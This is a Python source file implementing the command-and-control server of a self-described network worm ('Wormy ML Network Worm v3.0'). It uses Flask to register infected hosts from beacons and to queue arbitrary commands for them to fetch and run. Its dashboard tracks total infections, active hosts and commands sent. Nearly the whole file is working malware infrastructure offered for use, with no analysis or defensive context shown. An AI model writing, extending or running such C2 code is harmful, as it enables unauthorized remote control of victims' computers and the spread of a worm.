"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Command & Control (C2) Server
Manages infected hosts and provides remote control capabilities
"""


import json
import os
import threading
import time
from datetime import datetime
from typing import Dict, List

from flask import Flask, jsonify, render_template, request

from utils.logger import logger


class C2Server:
    """
    Command and Control Server
    Manages infected hosts, sends commands, receives beacons
    """

    def __init__(self, host="0.0.0.0", port=8443):
        self.host = host
        self.port = port
        self.app = Flask(__name__)

        # Infected hosts database
        self.infected_hosts = {}
        self.command_queue = {}
        self.beacon_history = []

        # Statistics
        self.stats = {
            "total_infections": 0,
            "active_hosts": 0,
            "total_beacons": 0,
            "commands_sent": 0,
            "start_time": datetime.now().isoformat(),
        }

        # Setup routes
        self._setup_routes()

        logger.info(f"C2 Server initialized on {host}:{port}")

    def _setup_routes(self):
        """Setup Flask routes"""

        # FIX: Generate API key for authentication
        import secrets
        self.api_key = os.getenv("WORMY_C2_API_KEY", secrets.token_hex(32))

        def require_api_key(f):
            """Decorator to require API key authentication"""
            from functools import wraps

            @wraps(f)
            def decorated(*args, **kwargs):
                key = request.headers.get("X-API-Key") or request.args.get("api_key")
                if key != self.api_key:
                    return jsonify({"error": "Unauthorized"}), 401
                return f(*args, **kwargs)
            return decorated

        @self.app.route("/")
        def dashboard():
            """Main dashboard"""
            return self.get_dashboard_html()

        @self.app.route("/api/beacon", methods=["POST"])
        @require_api_key
        def receive_beacon():
            """Receive beacon from infected host"""
            data = request.json
            return jsonify(self.process_beacon(data))

        @self.app.route("/api/command/<host_id>", methods=["GET"])
        @require_api_key
        def get_command(host_id):
            """Get pending command for host"""
            command = self.get_pending_command(host_id)
            return jsonify({"command": command})

        @self.app.route("/api/stats", methods=["GET"])
        @require_api_key
        def get_stats():
            """Get server statistics"""
            return jsonify(self.get_statistics())

        @self.app.route("/api/hosts", methods=["GET"])
        @require_api_key
        def get_hosts():
            """Get all infected hosts"""
            return jsonify(self.get_all_hosts())

        @self.app.route("/api/send_command", methods=["POST"])
        @require_api_key
        def send_command():
            """Send command to host"""
            data = request.json
            host_id = data.get("host_id")
            command = data.get("command")

            if host_id and command:
                self.queue_command(host_id, command)
                return jsonify({"status": "success"})
            return jsonify({"status": "error", "message": "Missing parameters"})

    def process_beacon(self, data: Dict) -> Dict:
        """
        Process beacon from infected host

        Args:
            data: Beacon data containing host info

        Returns:
            Response dict
        """
        host_id = data.get("host_id")

        if not host_id:
            return {"status": "error", "message": "No host_id provided"}

        # Update or create host entry
        if host_id not in self.infected_hosts:
            self.infected_hosts[host_id] = {
                "host_id": host_id,
                "ip": data.get("ip"),
                "hostname": data.get("hostname"),
                "os": data.get("os"),
                "first_seen": datetime.now().isoformat(),
                "last_beacon": datetime.now().isoformat(),
                "beacon_count": 0,
                "status": "active",
            }
            self.stats["total_infections"] += 1
            logger.success(f"New infected host registered: {host_id} ({data.get('ip')})")
        else:
            self.infected_hosts[host_id]["last_beacon"] = datetime.now().isoformat()
            self.infected_hosts[host_id]["beacon_count"] += 1

        # Update statistics
        self.stats["total_beacons"] += 1
        self.stats["active_hosts"] = len(
            [h for h in self.infected_hosts.values() if h["status"] == "active"]
        )

        # Record beacon
        self.beacon_history.append(
            {"host_id": host_id, "timestamp": datetime.now().isoformat(), "data": data}
        )

        # Keep only last 1000 beacons
        if len(self.beacon_history) > 1000:
            self.beacon_history = self.beacon_history[-1000:]

        logger.debug(f"Beacon received from {host_id}")

        return {
            "status": "success",
            "message": "Beacon processed",
            "has_command": host_id in self.command_queue,
        }

    def queue_command(self, host_id: str, command: str):
        """Queue command for host"""
        if host_id not in self.command_queue:
            self.command_queue[host_id] = []

        self.command_queue[host_id].append(
            {"command": command, "timestamp": datetime.now().isoformat(), "status": "pending"}
        )

        self.stats["commands_sent"] += 1
        logger.info(f"Command queued for {host_id}: {command}")

    def get_pending_command(self, host_id: str) -> Dict:
        """Get next pending command for host"""
        if host_id in self.command_queue and self.command_queue[host_id]:
            cmd = self.command_queue[host_id].pop(0)
            cmd["status"] = "sent"
            return cmd
        return None

    def get_statistics(self) -> Dict:
        """Get server statistics"""
        return self.stats

    def get_all_hosts(self) -> List[Dict]:
        """Get all infected hosts"""
        return list(self.infected_hosts.values())

    def get_dashboard_html(self) -> str:
        """Generate HTML dashboard"""
        html = (
            """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .stat-card h3 {
            font-size: 0.9em;
            opacity: 0.8;
            margin-bottom: 10px;
        }
        .stat-card .value {
            font-size: 2.5em;
            font-weight: bold;
        }
        .hosts-table {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        th {
            font-weight: 600;
            opacity: 0.9;
        }
        .status-active {
            color: #4ade80;
            font-weight: bold;
        }
        .refresh-btn {
            background: rgba(255,255,255,0.2);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 1em;
            margin-bottom: 20px;
        }
        .refresh-btn:hover {
            background: rgba(255,255,255,0.3);
        }
    </style>
    <script>
        function refreshData() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('total-infections').textContent = data.total_infections;
                    document.getElementById('active-hosts').textContent = data.active_hosts;
                    document.getElementById('total-beacons').textContent = data.total_beacons;
                    document.getElementById('commands-sent').textContent = data.commands_sent;
                });
            
            fetch('/api/hosts')
                .then(r => r.json())
                .then(hosts => {
                    const tbody = document.getElementById('hosts-tbody');
                    tbody.innerHTML = hosts.map(h => `
                        <tr>
                            <td>${h.host_id}</td>
                            <td>${h.ip}</td>
                            <td>${h.hostname || 'Unknown'}</td>
                            <td>${h.os || 'Unknown'}</td>
                            <td>${h.beacon_count}</td>
                            <td class="status-active">${h.status}</td>
                        </tr>
                    `).join('');
                });
        }
        
        setInterval(refreshData, 5000);
        window.onload = refreshData;
    </script>
</head>
<body>
    <div class="container">
        <h1>🎯 C2 Server Dashboard</h1>
        
        <button class="refresh-btn" onclick="refreshData()">🔄 Refresh</button>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Infections</h3>
                <div class="value" id="total-infections">"""
            + str(self.stats["total_infections"])
            + """</div>
            </div>
            <div class="stat-card">
                <h3>Active Hosts</h3>
                <div class="value" id="active-hosts">"""
            + str(self.stats["active_hosts"])
            + """</div>
            </div>
            <div class="stat-card">
                <h3>Total Beacons</h3>
                <div class="value" id="total-beacons">"""
            + str(self.stats["total_beacons"])
            + """</div>
            </div>
            <div class="stat-card">
                <h3>Commands Sent</h3>
                <div class="value" id="commands-sent">"""
            + str(self.stats["commands_sent"])
            + """</div>
            </div>
        </div>
        
        <div class="hosts-table">
            <h2 style="margin-bottom: 20px;">Infected Hosts</h2>
            <table>
                <thead>
                    <tr>
                        <th>Host ID</th>
                        <th>IP Address</th>
                        <th>Hostname</th>
                        <th>OS</th>
                        <th>Beacons</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody id="hosts-tbody">
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
        """
        )
        return html

    def run(self, debug=False):
        """Start C2 server"""
        logger.info(f"Starting C2 Server on {self.host}:{self.port}")
        self.app.run(host=self.host, port=self.port, debug=debug, threaded=True)

    def run_background(self):
        """Run C2 server in background thread"""
        thread = threading.Thread(target=self.run, daemon=True)
        thread.start()
        logger.info("C2 Server running in background")
        return thread


if __name__ == "__main__":
    # Test C2 server
    server = C2Server(host="127.0.0.1", port=8443)

    print("=" * 60)
    print("C2 SERVER STARTED")
    print("=" * 60)
    print(f"Dashboard: http://127.0.0.1:8443")
    print(f"API Endpoint: http://127.0.0.1:8443/api/beacon")
    print("=" * 60)

    server.run(debug=True)
